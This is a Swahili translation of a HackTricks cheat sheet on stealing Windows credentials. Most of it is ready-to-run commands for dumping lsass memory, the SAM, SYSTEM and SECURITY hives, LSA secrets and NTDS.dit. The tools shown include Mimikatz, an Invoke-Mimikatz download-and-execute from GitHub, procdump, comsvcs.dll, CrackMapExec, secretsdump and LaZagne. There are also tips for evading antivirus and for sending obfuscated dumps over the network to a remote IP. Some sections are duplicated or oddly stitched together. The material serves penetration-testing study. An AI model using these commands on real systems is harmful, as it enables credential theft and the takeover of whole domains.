# Kuiba Nenosiri za Windows

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa katika HackTricks** au **kupakua HackTricks katika PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**rasmi PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Nenosiri Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pata mambo mengine ambayo Mimikatz inaweza kufanya katika** [**ukurasa huu**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Jifunze kuhusu baadhi ya ulinzi wa nywila hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoa baadhi ya nywila.**

## Nywila na Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ambayo** nimeunda **kutafuta nywila na hashes** ndani ya mwathirika.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni chombo halali cha Microsoft**, hakigunduliwi na Defender.\
Unaweza kutumia chombo hiki **kudump mchakato wa lsass**, **kupakua dump** na **kutoa** **credentials ndani** kutoka kwenye dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}

{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Mchakato huu unafanywa kiotomatiki na [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kugundua** kama **malicious** matumizi ya **procdump.exe to dump lsass.exe**, hii ni kwa sababu wanagundua mfuatano wa maneno **"procdump.exe" na "lsass.exe"**. Kwa hiyo ni **stealthier** **kupitisha** kama **argument** **PID** ya lsass.exe kwa procdump **badala ya** jina **lsass.exe.**

### Dumping lsass na **comsvcs.dll**

DLL inayoitwa **comsvcs.dll** inayopatikana katika `C:\Windows\System32` inahusika na **dumping process memory** wakati wa ajali. DLL hii inajumuisha **function** inayoitwa **`MiniDumpW`**, iliyoundwa kutumika kwa kutumia `rundll32.exe`.\
Sio muhimu kutumia hoja mbili za kwanza, lakini ya tatu imegawanywa katika vipengele vitatu. Kitambulisho cha mchakato kinachopaswa kudump ni kipengele cha kwanza, eneo la faili la dump ni kipengele cha pili, na kipengele cha tatu ni neno **full**. Hakuna chaguo mbadala.\
Baada ya kuchambua vipengele hivi vitatu, DLL inahusika na kuunda faili ya dump na kuhamisha kumbukumbu ya mchakato maalum kwenye faili hii.\
Matumizi ya **comsvcs.dll** yanawezekana kwa kudump mchakato wa lsass, hivyo kuondoa haja ya kupakia na kutekeleza procdump. Njia hii imeelezewa kwa kina katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Amri ifuatayo inatumika kwa utekelezaji:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Unaweza kuendesha mchakato huu kiotomatiki kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Kutoa lsass kwa kutumia Task Manager**

1. Bonyeza kulia kwenye Task Bar na bonyeza Task Manager
2. Bonyeza More details
3. Tafuta mchakato wa "Local Security Authority Process" kwenye kichupo cha Processes
4. Bonyeza kulia kwenye mchakato wa "Local Security Authority Process" na bonyeza "Create dump file".

### Kutoa lsass kwa kutumia procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyosainiwa na Microsoft ambayo ni sehemu ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Chombo cha Kulinda Mchakato wa Kutoa Kumbukumbu ambacho kinaunga mkono kuficha dump ya kumbukumbu na kuhamisha kwenye vituo vya kazi vya mbali bila kuiweka kwenye diski.

**Uwezo Muhimu**:

1. Kuepuka ulinzi wa PPL
2. Kuficha faili za dump za kumbukumbu ili kuepuka mifumo ya kugundua ya Defender inayotegemea saini
3. Kupakia dump ya kumbukumbu kwa mbinu za RAW na SMB bila kuiweka kwenye diski (fileless dump)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### Dump SAM hashes

### Kutumia CrackMapExec kutoa SAM hashes

CrackMapExec ni zana yenye nguvu inayotumiwa na wataalamu wa usalama na wahalifu wa mtandao kwa shughuli mbalimbali za usalama. Moja ya matumizi yake ni kutoa SAM hashes kutoka kwa mifumo ya Windows. Hii inaweza kusaidia katika kutambua udhaifu wa usalama na kuchukua hatua zinazofaa.

```bash
cme smb <target_ip> -u <username> -p <password> --sam
```

Amri hii itatoa SAM hashes kutoka kwa mfumo lengwa. Ni muhimu kutumia zana hii kwa uwajibikaji na kwa madhumuni ya kisheria pekee.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Kutoa siri za LSA

### Mimikatz

Mimikatz ni zana maarufu inayotumiwa na wavamizi na wataalamu wa usalama kutoa nywila na hati za uthibitisho kutoka kwa mifumo ya Windows. Inatumika sana katika pentesting na shughuli za uchunguzi wa usalama.

```shell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### Procdump

Procdump ni zana ya Microsoft inayotumiwa kutoa faili za kumbukumbu za mchakato. Inaweza kutumika kutoa kumbukumbu za mchakato wa LSASS, ambazo zinaweza kuchambuliwa ili kupata nywila na hati za uthibitisho.

```shell
procdump -ma lsass.exe lsass.dmp
```

### Task Manager

Unaweza pia kutumia Task Manager kutoa kumbukumbu za mchakato wa LSASS.

1. Fungua Task Manager.
2. Tafuta mchakato wa `lsass.exe`.
3. Bonyeza kulia na uchague `Create Dump File`.

### Out-Minidump.ps1

Out-Minidump.ps1 ni script ya PowerShell inayotumiwa kutoa kumbukumbu za mchakato wa LSASS.

```shell
Out-Minidump -Name lsass -Path lsass.dmp
```

### Invoke-Mimikatz

Invoke-Mimikatz ni moduli ya PowerShell inayotumiwa kuendesha Mimikatz moja kwa moja kutoka kwa PowerShell.

```shell
Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
```

### CrackMapExec

CrackMapExec ni zana ya usalama inayotumiwa kufanya mashambulizi ya mtandao na kutoa hati za uthibitisho kutoka kwa mifumo ya Windows.

```shell
crackmapexec smb <target_ip> -u <username> -p <password> --lsa
```

### SecretsDump

SecretsDump ni zana ya Impacket inayotumiwa kutoa nywila na hati za uthibitisho kutoka kwa mifumo ya Windows.

```shell
secretsdump.py <domain>/<username>@<target_ip>
```
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Kutoa NTDS.dit kutoka kwa DC lengwa
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Kutoa historia ya nywila ya NTDS.dit kutoka kwa DC lengwa
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kuiba SAM & SYSTEM

Hizi faili zinapaswa kuwa **zimewekwa** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi tu kuzinakili kwa njia ya kawaida** kwa sababu zinalindwa.

### Kutoka kwa Registry

Njia rahisi ya kuiba faili hizo ni kupata nakala kutoka kwa registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pakua** faili hizo kwenye mashine yako ya Kali na **toa hashes** ukitumia:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Unaweza kufanya nakala ya faili zilizolindwa kwa kutumia huduma hii. Unahitaji kuwa Msimamizi.

#### Kutumia vssadmin

vssadmin binary inapatikana tu katika matoleo ya Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Lakini unaweza kufanya vivyo hivyo kutoka **Powershell**. Hii ni mfano wa **jinsi ya kunakili faili la SAM** (diski kuu inayotumika ni "C:" na imehifadhiwa kwenye C:\users\Public) lakini unaweza kutumia hii kunakili faili lolote lililolindwa:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Hatimaye, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kufanya nakala ya SAM, SYSTEM na ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** ni faili linalojulikana kama moyo wa **Active Directory**, likihifadhi data muhimu kuhusu vitu vya watumiaji, vikundi, na uanachama wao. Hapa ndipo **password hashes** za watumiaji wa domain zinapohifadhiwa. Faili hili ni **Extensible Storage Engine (ESE)** database na linapatikana kwenye **_%SystemRoom%/NTDS/ntds.dit_**.

Ndani ya database hii, meza kuu tatu zinahifadhiwa:

- **Data Table**: Meza hii inahusika na kuhifadhi maelezo kuhusu vitu kama watumiaji na vikundi.
- **Link Table**: Inafuatilia mahusiano, kama uanachama wa vikundi.
- **SD Table**: **Security descriptors** kwa kila kitu zinahifadhiwa hapa, zikihakikisha usalama na udhibiti wa upatikanaji wa vitu vilivyohifadhiwa.

Maelezo zaidi kuhusu hili: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows inatumia _Ntdsa.dll_ kuingiliana na faili hilo na inatumika na _lsass.exe_. Kisha, **sehemu** ya faili **NTDS.dit** inaweza kupatikana **ndani ya `lsass`** memory (unaweza kupata data iliyofikiwa hivi karibuni labda kwa sababu ya kuboresha utendaji kwa kutumia **cache**).

#### Kufungua hashes ndani ya NTDS.dit

Hash inafunguliwa mara 3:

1. Fungua Password Encryption Key (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Fungua **hash** kwa kutumia **PEK** na **RC4**.
3. Fungua **hash** kwa kutumia **DES**.

**PEK** ina **thamani sawa** katika **kila domain controller**, lakini imefungwa ndani ya faili **NTDS.dit** kwa kutumia **BOOTKEY** ya **SYSTEM file ya domain controller (ni tofauti kati ya domain controllers)**. Hii ndiyo sababu ili kupata credentials kutoka faili la NTDS.dit **unahitaji faili za NTDS.dit na SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kunakili NTDS.dit kwa kutumia Ntdsutil

Inapatikana tangu Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Unaweza pia kutumia mbinu ya [**volume shadow copy**](./#stealing-sam-and-system) kunakili faili la **ntds.dit**. Kumbuka kuwa utahitaji pia nakala ya **SYSTEM file** (tena, [**itoa kutoka kwenye registry au tumia mbinu ya volume shadow copy**](./#stealing-sam-and-system)).

### **Kutoa hashes kutoka NTDS.dit**

Baada ya kupata faili za **NTDS.dit** na **SYSTEM** unaweza kutumia zana kama _secretsdump.py_ **kutoa hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Unaweza pia **kuzitoa kiotomatiki** ukitumia mtumiaji halali wa admin wa domain:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Kwa **mafaili makubwa ya NTDS.dit** inashauriwa kuyatoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Hatimaye, unaweza pia kutumia **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa vitu vya domain kutoka NTDS.dit hadi kwenye hifadhidata ya SQLite**

Vitu vya NTDS vinaweza kutolewa hadi kwenye hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio siri tu zinazotolewa bali pia vitu vyote na sifa zao kwa uchimbaji wa taarifa zaidi wakati faili ghafi la NTDS.dit tayari limepatikana.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive ni hiari lakini inaruhusu usimbuaji wa siri (NT & LM hashes, nywila za wazi, funguo za kerberos au za uaminifu, historia za nywila za NT & LM). Pamoja na taarifa nyingine, data ifuatayo inatolewa: akaunti za mtumiaji na mashine na hashes zao, bendera za UAC, muda wa mwisho wa kuingia na kubadilisha nywila, maelezo ya akaunti, majina, UPN, SPN, vikundi na uanachama wa kurudia, mti wa vitengo vya shirika na uanachama, maeneo yanayoaminika na aina za uaminifu, mwelekeo na sifa...

## Lazagne

Pakua binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). unaweza kutumia binary hii kutoa nywila kutoka kwa programu kadhaa.
```
lazagne.exe all
```
## Zana zingine za kutoa hati kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Chombo hiki kinaweza kutumika kutoa hati kutoka kwenye kumbukumbu. Pakua kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Toa hati kutoka kwenye faili la SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Kutoa hati kutoka kwenye faili la SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pakua kutoka: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) na **itekeleze** tu na nywila zitachukuliwa.

## Ulinzi

[**Jifunze kuhusu baadhi ya ulinzi wa nywila hapa.**](credentials-protections.md)

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa katika HackTricks** au **kupakua HackTricks katika PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za hacking kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
